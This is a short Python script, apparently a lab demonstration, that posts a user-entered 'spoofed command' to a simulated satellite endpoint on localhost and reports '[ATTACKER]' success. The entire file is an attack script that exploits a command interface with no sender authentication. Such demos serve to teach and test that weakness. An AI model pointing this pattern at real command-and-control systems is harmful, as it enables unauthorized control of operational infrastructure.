import requests

SATELLITE_URL = "http://127.0.0.1:5001/receive-command"

def spoof_command():
    fake_command = input("Enter spoofed command to send to satellite: ")
    try:
        response = requests.post(SATELLITE_URL, json={"command": fake_command})
        if response.status_code == 200:
            print("[ATTACKER] Successfully spoofed command!")
            print(response.json())
        else:
            print("[ATTACKER] Failed to spoof command. Status:", response.status_code)
    except Exception as e:
        print("[ERROR] Could not reach satellite:", e)

if __name__ == "__main__":
    spoof_command()
